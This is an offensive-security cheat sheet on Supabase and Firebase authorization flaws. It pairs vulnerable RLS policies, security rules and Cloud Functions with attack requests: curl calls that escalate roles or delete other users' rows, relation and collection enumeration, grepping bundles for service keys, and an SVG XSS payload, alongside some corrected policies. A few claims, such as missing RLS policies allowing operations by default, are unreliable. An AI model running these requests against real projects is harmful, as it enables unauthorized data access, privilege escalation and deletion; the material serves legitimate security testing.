# Backend-as-a-Service Security

*Supabase & Firebase vulnerabilities: RLS gaps, security rules bypass, service key leakage*

---

## TL;DR

**Supabase** = PostgreSQL + PostgREST + Row Level Security (RLS)  
**Firebase** = NoSQL + Security Rules

Both rely on client-side authorization enforcement. If RLS policies or security rules are missing/misconfigured, complete database access is possible.

**Key Issues:**
- Authorization defined client-side → easy to bypass with direct API calls
- Missing policies/rules for specific operations (SELECT ≠ UPDATE ≠ DELETE)
- Service/admin keys leaked in client bundles
- RLS bypassed via `SECURITY DEFINER` functions
- Realtime subscriptions without proper authorization

---

# Supabase Security

## How It Works

### Supabase Architecture

1. **PostgreSQL** — Your database
2. **PostgREST** — Auto-generated REST API
3. **RLS (Row Level Security)** — PostgreSQL policies enforcing access control
4. **Auth** — User management and JWT issuing
5. **Realtime** — WebSocket subscriptions to database changes

**The Gap:** RLS policies must be manually created for every table and operation. Developers often miss operations or edge cases.

---

## Detection

```bash
# Supabase instance
https://PROJECT.supabase.co

# API endpoints
/rest/v1/*          → PostgREST
/auth/v1/*          → Auth endpoints
/storage/v1/*       → Storage
/realtime/v1/*      → Realtime WebSocket

# Headers
apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Authorization: Bearer <JWT>
```

---

## Exploitation

### 1. Row Level Security (RLS) Gaps

**Missing Policies:**

```sql
-- Policy exists for SELECT only
CREATE POLICY "users_select_own" ON users
  FOR SELECT
  USING (auth.uid() = id);

-- ❌ No policies for UPDATE/DELETE/INSERT
-- Result: Operations are ALLOWED by default (or DENIED based on default policy)
```

**Attack:**
```bash
# SELECT works as expected (policy enforced)
curl "https://PROJECT.supabase.co/rest/v1/users?select=*" \
  -H "apikey: ANON_KEY" \
  -H "Authorization: Bearer USER_JWT"

# UPDATE has no policy → might be open or denied
curl -X PATCH "https://PROJECT.supabase.co/rest/v1/users?id=eq.ANY_ID" \
  -H "apikey: ANON_KEY" \
  -H "Authorization: Bearer USER_JWT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# DELETE has no policy
curl -X DELETE "https://PROJECT.supabase.co/rest/v1/users?id=eq.ANY_ID" \
  -H "apikey: ANON_KEY" \
  -H "Authorization: Bearer USER_JWT"
```

**Test Each Operation:**
- `SELECT` (read)
- `INSERT` (create)
- `UPDATE` (modify)
- `DELETE` (remove)

---

### 2. Cross-Tenant Access

**Vulnerable Policy:**
```sql
-- Missing tenant_id check
CREATE POLICY "documents_select" ON documents
  FOR SELECT
  USING (auth.uid() IS NOT NULL);  -- ❌ Any authenticated user
```

**Attack:**
```bash
# Access another organization's data
GET /rest/v1/documents?org_id=eq.OTHER_ORG_ID

# OR injection
GET /rest/v1/documents?or=(org_id.eq.victim_org,org_id.is.null)
```

**Correct Policy:**
```sql
CREATE POLICY "documents_select" ON documents
  FOR SELECT
  USING (
    auth.uid() IS NOT NULL AND
    org_id = (SELECT org_id FROM users WHERE id = auth.uid())
  );
```

---

### 3. Embedded Relations Leak

PostgREST allows embedding related tables:

```bash
# Primary query has RLS policy
GET /rest/v1/orders?select=*

# But embedding relations might not
GET /rest/v1/orders?select=*,customer(email,phone,address)
GET /rest/v1/orders?select=*,user(role,is_admin)

# If RLS not on 'customer' or 'user' table → data leak
```

**Attack Strategy:**
```bash
# Enumerate relations
GET /rest/v1/TABLE?select=*,relation1(*),relation2(*),relation3(*)

# Find tables without RLS policies
```

---

### 4. RPC Function Bypass (SECURITY DEFINER)

**Vulnerable Function:**
```sql
-- SECURITY DEFINER runs with creator's privileges (bypasses RLS)
CREATE FUNCTION get_all_users()
RETURNS SETOF users
SECURITY DEFINER  -- ❌ DANGER
AS $$
  SELECT * FROM users;  -- No RLS applied!
$$ LANGUAGE sql;
```

**Attack:**
```bash
POST /rest/v1/rpc/get_all_users
Content-Type: application/json
{}

# Returns all users, bypassing RLS
```

**Detection:**
```sql
-- Find SECURITY DEFINER functions
SELECT routine_name, security_type
FROM information_schema.routines
WHERE security_type = 'DEFINER';
```

---

### 5. Service Role Key Leakage

**Two Key Types:**

```javascript
// Anon key (public, RLS enforced)
const supabase = createClient(URL, 'eyJhbGci...public_anon_key');

// Service role key (DANGER: bypasses RLS!)
const supabase = createClient(URL, 'eyJhbGci...service_role_key');
```

**Where to Look:**
```bash
# Client-side JavaScript bundles
curl https://target.com/static/js/main.js | grep "eyJhbGci"

# Environment variables exposed
console.log(process.env)  # In browser console

# Error messages
# Stack traces in dev mode
```

**Impact:** Service role key = full database access, bypassing all RLS.

---

### 6. Storage Bucket Misconfiguration

```bash
# Public buckets without proper policies
GET /storage/v1/object/public/uploads/sensitive-doc.pdf

# Missing security headers
# If nosniff header absent → XSS via SVG/HTML upload
```

**Test:**
```bash
# List bucket contents
GET /storage/v1/object/list/BUCKET_NAME

# Upload without auth
POST /storage/v1/object/BUCKET_NAME/malicious.svg
Content-Type: image/svg+xml

<svg onload="alert(document.domain)"></svg>
```

---

### 7. Realtime Channel Authorization

**Vulnerable Pattern:**
```javascript
// Subscribe to any user's channel
const channel = supabase
  .channel('user:VICTIM_ID')  // No authz check
  .on('*', (payload) => console.log(payload))
  .subscribe();
```

**Attack:**
```javascript
// Listen to private channels
supabase.channel('orders:org_VICTIM_ORG').subscribe();
supabase.channel('user:ADMIN_ID').subscribe();
```

---

## Bypasses

### Count Inference (Side Channel)

```bash
# Exact count header reveals record existence
GET /rest/v1/users?email=eq.admin@target.com
Prefer: count=exact

# Response:
Content-Range: 0-0/1  # Email exists!
Content-Range: 0-0/0  # Doesn't exist
```

### Filter Enumeration

```bash
# Test every filter operator
?id=eq.1
?id=gt.0
?id=lt.999
?email=like.*@admin.com
?role=in.(admin,superuser)
```

---

## Pro Tips (Supabase)

1. **Test each CRUD operation separately** — SELECT policy ≠ UPDATE policy
2. **Embed relations** — `?select=*,private_table(*)` often bypasses RLS
3. **RPC functions** — Check for `SECURITY DEFINER` without internal authz
4. **Service role key** — If leaked, game over (full DB access)
5. **Realtime** — Authorization at subscription, not per-message
6. **Count headers** — Side channel for enumeration

---

# Firebase Security

## How It Works

### Firebase Architecture

1. **Firestore/Realtime Database** — NoSQL document store
2. **Security Rules** — Declarative access control (not server-side enforcement)
3. **Cloud Functions** — Server-side logic (can bypass rules with Admin SDK)
4. **Authentication** — User management

**The Gap:** Security rules are compiled and executed client-side (on Firebase servers, but based on client requests). Missing rules = open database.

---

## Detection

```bash
# Firebase project
https://PROJECT.firebaseapp.com
https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/*

# JavaScript SDK
firebase.initializeApp({...})
```

---

## Exploitation

### 1. Missing or Permissive Security Rules

**Open Database (Default):**
```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;  // ❌ COMPLETELY OPEN
    }
  }
}
```

**Insufficient Validation:**
```javascript
// Only checks authentication, not ownership
allow read: if request.auth != null;

// ❌ Any authenticated user can read ANY document
```

**Attack:**
```bash
# Direct API access
curl "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/users/ADMIN_ID" \
  -H "Authorization: Bearer USER_TOKEN"

# Returns admin user data (authz not enforced)
```

---

### 2. Wildcard Abuse

**Overly Broad Rules:**
```javascript
// Intended: /users/{userId}/posts/{postId}
match /users/{userId}/{document=**} {
  allow read: if request.auth.uid == userId;
}

// ❌ Matches:
// /users/USER_ID/anything
// /users/USER_ID/private/secrets
// /users/USER_ID/admin/config

// But doesn't match:
// /admin/users  ← might be OPEN
```

---

### 3. Collection Enumeration

**List Documents:**
```javascript
// If rules allow listing
const snapshot = await db.collection('users').get();
snapshot.forEach(doc => {
  console.log(doc.id, doc.data());
});

// Full database dump if rules permit
```

**Attack:**
```bash
# REST API
GET https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/users
Authorization: Bearer TOKEN

# Returns all user documents
```

---

### 4. Realtime Listeners Cross-User

**Vulnerable Listener:**
```javascript
// No ownership check in rules
db.collection('messages')
  .where('recipient', '==', 'VICTIM_ID')
  .onSnapshot((snapshot) => {
    snapshot.docChanges().forEach((change) => {
      console.log(change.doc.data());  // Leak messages
    });
  });
```

---

### 5. Cloud Functions Without Authorization

**Vulnerable HTTP Function:**
```javascript
exports.deleteUser = functions.https.onRequest((req, res) => {
  // ❌ No auth check
  const userId = req.body.userId;
  
  admin.firestore().collection('users').doc(userId).delete();
  
  res.send('Deleted');
});
```

**Attack:**
```bash
POST https://REGION-PROJECT.cloudfunctions.net/deleteUser
Content-Type: application/json

{"userId": "VICTIM_ID"}
```

**Callable Functions:**
```javascript
exports.deleteUser = functions.https.onCall((data, context) => {
  // ❌ context.auth might be null if not checked
  if (!context.auth) {
    throw new functions.https.HttpsError('unauthenticated', 'Must be logged in');
  }
  
  // Still need to check if user CAN delete this specific userId
});
```

---

### 6. Admin SDK Bypasses Rules

**In Cloud Functions:**
```javascript
// Admin SDK bypasses ALL security rules
const admin = require('firebase-admin');
admin.initializeApp();

// ❌ No rules enforced
admin.firestore().collection('users').doc('ANY_ID').get();
```

**Impact:** If Cloud Function has logic flaw, attacker bypasses all Firestore rules.

---

## Bypasses

### Direct REST API Calls

Bypass the Firebase SDK and call the REST API directly:

```bash
# Get auth token
firebase login

# Direct API call
curl "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/COLLECTION/DOC_ID" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)"
```

### Firestore Emulator Testing

```bash
# Use Firebase emulator to test rules locally
firebase emulators:start

# Enumerate all possible paths
# Test with/without auth
# Test with different user contexts
```

---

## Pro Tips (Firebase)

1. **Test rules with emulator** — Firebase provides testing tools
2. **Enumerate collections** — If list operation allowed, dump entire database
3. **Cloud Functions** — Check for missing `context.auth` validation
4. **Realtime listeners** — Can subscribe to any query if rules permit
5. **Admin SDK** — Used in Cloud Functions, bypasses all rules
6. **Direct API** — Bypass SDK quirks, test rules directly

---

# Combined Pro Tips

## Universal BaaS Attack Strategy

1. **Identify the platform** — Supabase (PostgREST headers) vs Firebase (googleapis.com)
2. **Enumerate endpoints** — REST API paths, RPC functions, Cloud Functions
3. **Test authorization separately:**
   - Read vs Write vs Delete
   - Per-table/collection
   - Per-operation
4. **Look for service/admin keys** — In client bundles, source maps, errors
5. **Test embedded relations** (Supabase) or subcollections (Firebase)
6. **Bypass with direct API calls** — Don't rely on SDK-level restrictions

---

## Rapid Validation Checklist

**Supabase:**
- [ ] Test SELECT/INSERT/UPDATE/DELETE separately on each table
- [ ] Enumerate embedded relations: `?select=*,table2(*)`
- [ ] Check for `SECURITY DEFINER` functions
- [ ] Search client code for service_role key
- [ ] Test cross-tenant access via `org_id` or similar fields
- [ ] Subscribe to Realtime channels you shouldn't access

**Firebase:**
- [ ] List collections with authenticated user
- [ ] Test direct REST API calls to sensitive documents
- [ ] Enumerate Cloud Functions (HTTP and Callable)
- [ ] Check `context.auth` validation in functions
- [ ] Subscribe to Realtime listeners for other users
- [ ] Test wildcard rule edge cases

---

## References

**Supabase:**
- [Supabase RLS Documentation](https://supabase.com/docs/guides/auth/row-level-security)
- [PostgREST API Reference](https://postgrest.org/en/stable/api.html)
- [PostgreSQL RLS Policies](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)

**Firebase:**
- [Firestore Security Rules](https://firebase.google.com/docs/firestore/security/get-started)
- [Firebase Security Rules Testing](https://firebase.google.com/docs/rules/unit-tests)
- [Cloud Functions Security](https://firebase.google.com/docs/functions/auth-blocking)
- [Firebase REST API](https://firebase.google.com/docs/reference/rest/database)

**General:**
- OWASP API Security Top 10
- [Backend-as-a-Service Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)
